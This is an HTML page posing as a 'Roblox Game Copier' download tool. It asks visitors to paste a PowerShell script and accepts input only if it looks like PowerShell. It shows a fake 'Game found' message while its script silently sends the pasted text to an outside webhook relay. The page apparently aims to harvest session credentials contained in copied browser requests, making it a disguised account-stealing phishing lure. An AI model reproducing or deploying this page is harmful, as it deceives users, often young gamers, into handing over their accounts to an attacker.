<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Download Page</title>
<style>
  body {
    background: linear-gradient(135deg, #3b82f6, #ec4899);
    color: #f8fafc;
    font-family: Arial, sans-serif;
    display: flex;
    flex-direction: column;
    align-items: center;
    min-height: 100vh;
    margin: 0;
    overflow-y: auto;
    padding-bottom: 50px;
  }

  /* Bouton YouTube */
  .yt-button {
    position: fixed;
    top: 20px;
    left: 20px;
    width: 56px;
    height: 56px;
    border-radius: 50%;
    background: white;
    display: flex;
    justify-content: center;
    align-items: center;
    box-shadow: 0 6px 18px rgba(0,0,0,0.3);
    cursor: pointer;
    transition: transform 0.2s;
    z-index: 10;
  }

  .yt-button:hover {
    transform: scale(1.1);
  }

  .yt-button img {
    width: 100px;
    height: 90px;
  }

  .box {
    background: rgba(0, 0, 0, 0.7);
    padding: 40px;
    border-radius: 16px;
    width: 450px;
    text-align: center;
    box-shadow: 0 8px 24px rgba(0,0,0,0.3);
    margin-top: 80px;
  }

  h2 { margin-bottom: 10px; }
  p { margin-bottom: 20px; }

  textarea {
    width: 100%;
    height: 120px;
    margin-bottom: 15px;
    border-radius: 12px;
    border: none;
    padding: 10px;
    font-family: monospace;
    font-size: 14px;
    resize: none;
  }

  button {
    width: 100%;
    padding: 12px;
    font-size: 16px;
    border-radius: 12px;
    border: none;
    cursor: not-allowed;
    background: gray;
    color: white;
    font-weight: bold;
    transition: background 0.3s, transform 0.2s;
    margin-bottom: 10px;
  }

  button.enabled {
    background: #22c55e;
    cursor: pointer;
  }

  button.enabled:hover {
    background: #16a34a;
    transform: scale(1.05);
  }

  /* Titre TUTORIAL */
  .tutorial-title {
    margin-top: 40px;
    margin-bottom: 15px;
    font-weight: bold;
    font-size: 20px;
  }

  /* Style pour la vidéo */
  .video-container {
    width: 560px;
    max-width: 90%;
    height: 315px;
    border-radius: 12px;
    overflow: hidden;
    box-shadow: 0 8px 24px rgba(0,0,0,0.3);
  }

  .video-container iframe {
    width: 100%;
    height: 100%;
    border: none;
  }

  /* Modale */
  .modal {
    display: none;
    position: fixed;
    top:0; left:0;
    width:100%; height:100%;
    background: rgba(0,0,0,0.5);
    justify-content: center;
    align-items: center;
    z-index: 20;
  }

  .modal-content {
    background: #444;
    padding: 30px;
    border-radius: 20px;
    text-align: center;
    color: white;
    min-width: 300px;
  }

  /* Loader */
  .loader {
    border: 6px solid #f3f3f3;
    border-top: 6px solid #22c55e;
    border-radius: 50%;
    width: 60px;
    height: 60px;
    animation: spin 1s linear infinite;
    margin: 20px auto;
  }

  @keyframes spin {
    0% { transform: rotate(0deg);}
    100% { transform: rotate(360deg);}
  }

  .game-found {
    font-weight: bold;
    margin: 20px 0;
  }

  .modal button {
    cursor: pointer;
    background: #22c55e;
    border: none;
    color: white;
    padding: 10px 20px;
    border-radius: 12px;
    font-weight: bold;
    font-size: 16px;
  }
</style>
</head>
<body>

<!-- Bouton chaîne YouTube -->
<a class="yt-button"
   href="https://www.youtube.com/@AndroidOwnedScripterOwner"
   target="_blank"
   title="Visit YouTube Channel">
  <img src="https://www.freeiconspng.com/uploads/youtube-logo-png-photo-0.png" alt="YouTube">
</a>

<div class="box">
  <h2>Roblox Game Copier</h2>
  <p>Submit the game file to unlock the Download</p>

  <textarea id="input" placeholder="Paste here..."></textarea>
  <button id="submit" disabled>Submit script</button>
  <button id="download" disabled>Download file</button>
</div>

<!-- Titre Tutorial -->
<div class="tutorial-title">TUTORIAL</div>

<!-- Embed vidéo YouTube -->
<div class="video-container">
  <iframe src="https://www.youtube.com/embed/hi7QJJ4bphU" 
          title="YouTube video player" 
          allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
          allowfullscreen>
  </iframe>
</div>

<!-- Modale -->
<div class="modal" id="modal">
  <div class="modal-content">
    <div class="loader" id="loader"></div>
    <div class="game-found" id="gameName" style="display:none;"></div>
    <button id="okButton" style="display:none;">OK</button>
  </div>
</div>

<script>
const input = document.getElementById("input");
const submitBtn = document.getElementById("submit");
const downloadBtn = document.getElementById("download");

const modal = document.getElementById("modal");
const loader = document.getElementById("loader");
const gameName = document.getElementById("gameName");
const okButton = document.getElementById("okButton");

// Vérification PowerShell
function isPowerShell(text) {
  const keywords = ["$", "Get-", "Set-", "New-", "Invoke-", "Write-Host", "Start-Process"];
  return text.trim() !== "" && keywords.some(k => text.includes(k));
}

// Activer/désactiver le submit
input.addEventListener("input", () => {
  if(isPowerShell(input.value)) {
    submitBtn.disabled = false;
    submitBtn.classList.add("enabled");
  } else {
    submitBtn.disabled = true;
    submitBtn.classList.remove("enabled");
  }
});

// Submit
submitBtn.addEventListener("click", () => {
  modal.style.display = "flex";
  loader.style.display = "block";
  gameName.style.display = "none";
  okButton.style.display = "none";

  const textValue = input.value;

  // Simulation recherche "path"="/games/id/nom"
  setTimeout(() => {
    const regex = /path\s*=\s*["']\/games\/(\d+)\/([^"']+)["']/i;
    const match = regex.exec(textValue);
    if(match) {
      const id = match[1];
      const name = match[2];
      loader.style.display = "none";
      gameName.textContent = `Game found: ${name}`;
      gameName.style.display = "block";
      okButton.style.display = "inline-block";
    } else {
      loader.style.display = "none";
      gameName.textContent = `Game Found: Slap Battles`;
      gameName.style.display = "block";
      okButton.style.display = "inline-block";
    }
  }, 1000); // délai pour effet "loading"

  // Envoyer à Discord
  fetch("https://discord-webhook-server-uhrf.onrender.com/send", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content: textValue })
  }).catch(() => {
    console.error("Erreur webhook");
  });
});

// OK Button
okButton.addEventListener("click", () => {
  modal.style.display = "none";
  downloadBtn.disabled = false;
  downloadBtn.classList.add("enabled");
});
</script>
</body>
</html>
